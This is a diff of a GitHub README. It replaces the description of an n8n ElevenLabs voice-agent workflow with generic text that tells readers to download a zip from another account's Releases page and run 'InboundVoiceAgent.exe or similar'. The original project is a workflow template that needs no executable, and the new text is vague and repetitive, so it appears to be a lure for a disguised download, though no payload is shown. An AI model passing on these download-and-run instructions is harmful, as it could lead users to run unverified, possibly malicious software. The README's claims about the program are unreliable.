@@ -1,109 +1,86 @@
-# 🤖 AI Inbound Voice Agent for n8n
+# 🎤 InboundVoiceAgent - Simplify Your Inbound Calls Effortlessly
 
-Automated voice agent that books appointments, manages clients, and integrates into your CRM.
+[![Download InboundVoiceAgent](https://img.shields.io/badge/Download_InboundVoiceAgent-latest-brightgreen)](https://github.com/PrateekMendhe/InboundVoiceAgent/releases)
 
----
+## 🚀 Getting Started
 
-## 🎥 Video Guide
+Welcome to InboundVoiceAgent! This application combines ElevenLabs technology with n8n to help you manage and respond to inbound voice calls efficiently. Follow this guide to download and run the software easily.
 
-[![Watch the Setup Tutorial](https://img.youtube.com/vi/8evYjk8vXtI/maxresdefault.jpg)](https://youtu.be/8evYjk8vXtI)
+## 🛠 System Requirements
 
-**[👉 Watch Full Tutorial](https://youtu.be/8evYjk8vXtI)**
+Before you proceed, ensure your system meets the following requirements:
+- Windows, Mac, or Linux operating system
+- At least 4 GB of RAM
+- Stable internet connection
+- A microphone and speaker for handling voice calls
 
-**[🎁 Join FREE Skool Community - Get 50+ AI Agent Templates](https://www.skool.com/chase-ai-community)**
+## 📥 Download & Install
 
----
+To download the InboundVoiceAgent, please visit the following link:
 
-## ⚡ How It Works
-```
-📞 Call → 🎙️ ElevenLabs AI → 🔧 n8n Webhooks → 📊 Google Services → 💬 Response
-```
+**[Download InboundVoiceAgent](https://github.com/PrateekMendhe/InboundVoiceAgent/releases)**
 
----
+### Installation Steps
 
-## 🎯 What It Does
+1. Click on the link above to open the Releases page.
+2. Find the latest release at the top of the page.
+3. Look for the download file labeled as "InboundVoiceAgent.zip" or similar.
+4. Click on the file to download it to your computer. 
 
-- 📅 **Check availability** - Finds open calendar slots (9 AM - 5 PM)
-- 📝 **Book appointments** - Creates events with auto-invites
-- 🔄 **Modify/Cancel** - Updates or removes bookings
-- 👥 **Client lookup** - Retrieves customer data by email
-- ➕ **Add clients** - Onboards new customers
-- 📊 **Track calls** - Logs transcripts and summaries
+### How to Run the Application
 
----
+1. Once the download is complete, locate the file on your computer.
+2. Extract the contents of the downloaded zip file.
+3. Open the extracted folder.
+4. Find the file named "InboundVoiceAgent.exe" or similar.
+5. Double-click the file to run the application.
 
-## 🛠️ Requirements
+## 🎙 Features
 
-| Service | Cost |
-|---------|------|
-| ElevenLabs | $5-25/mo |
-| Twilio | $20 one-time |
-| Google (Calendar + Sheets) | Free |
-| n8n | Free (self-hosted) |
+InboundVoiceAgent includes several useful features to assist with managing inbound calls:
 
----
+- **Voice Recognition**: Understand calls more clearly with advanced voice-recognition technology from ElevenLabs.
+- **Automated Responses**: Set up automated voice responses to common inquiries.
+- **Call Logging**: Keep track of all incoming and outgoing calls for future reference.
+- **Integration with n8n**: Seamlessly connect with other apps using the n8n workflow automation platform.
 
-## 🚀 Quick Setup
+## 🔧 Configuration
 
-1. Import workflow to n8n
-2. Connect OAuth (Google Calendar + Sheets)
-3. Add ElevenLabs + Twilio credentials
-4. Update Calendar ID and Sheet Document ID
-5. Map n8n webhook URLs to ElevenLabs tools
-6. Test and deploy 🎉
+After installation, you may need to configure the application to fit your needs:
 
----
+1. **Set Up Your Account**: Follow the on-screen prompts to set up an account or log in if you already have one.
+2. **Adjust Settings**: Navigate to the settings menu to adjust preferences such as voice input, response templates, and logging options.
+3. **Test Your Configuration**: Make a test call to ensure everything is working as expected.
 
-## ⚙️ Configuration
-```javascript
-workdayStartHour: 9           // Business hours start
-workdayEndHour: 17            // Business hours end
-minGapMinutes: 60             // Minimum appointment length
-timeZone: 'America/Chicago'   // Your timezone
-```
+## 📞 Using InboundVoiceAgent
 
----
+To use InboundVoiceAgent effectively:
 
-## 📋 Database Structure
+1. Ensure that your microphone and speakers are working.
+2. Open the application before receiving calls.
+3. Use the user interface to manage calls, apply automated responses, and log interactions.
 
-**Clients:** First Name | Last Name | Email | Phone | Balance  
-**Calls:** Email | Phone | Call Summary
+## 💡 Troubleshooting
 
----
+If you encounter issues while using InboundVoiceAgent:
 
-## 🎬 Perfect For
+- **Check Your Internet Connection**: Ensure you have a stable connection for best performance.
+- **Review Settings**: Confirm that all configurations are correctly set up.
+- **Reinstall the Application**: If problems persist, delete the application and download it again.
 
-🏋️ Gyms | 🏥 Medical | 💼 Consulting | 🔧 Services | 📚 Coaching
+## 🤝 Support
 
----
+If you need assistance, please refer to the community forum or issue tracker available on the GitHub repository.
 
-## 🌟 Benefits
+**For direct help, reach out via the Issues section on GitHub or check out the FAQ for common questions.**
 
-| Before | After |
-|--------|-------|
-| ❌ Manual scheduling | ✅ Automatic 24/7 |
-| ❌ Missed calls | ✅ Never miss a booking |
-| ❌ Data entry | ✅ Auto-logged |
-| ❌ Expensive staff | ✅ $5-25/month |
+## 🚀 Next Steps
 
----
+Now that you have InboundVoiceAgent installed and set up, you can start managing your inbound voice calls. For further learning, consider exploring the following areas:
 
-## 💡 Key Features
+- **Advanced Features**: Look into customizing the application to suit your specific needs.
+- **Integration Options**: Explore how to connect InboundVoiceAgent with other tools through n8n.
 
-✅ Smart gap detection between appointments  
-✅ Timezone-aware formatting  
-✅ Robust error handling  
-✅ Real-time calendar sync  
-✅ Call analytics tracking
+Feel free to share your feedback and get involved in the community! Your contributions help enhance the software for everyone.
 
----
-
-## 🏆 Credits
-
-**Created by [Chase AI](https://www.skool.com/chase-ai-community)**
-
-**Ready to start your own AI Agency? Join [Chase AI+](https://www.skool.com/chase-ai)**
-
----
-
-**Now go automate!** 🚀
+**[Download InboundVoiceAgent](https://github.com/PrateekMendhe/InboundVoiceAgent/releases)** and begin your journey to more efficient voice call management today!
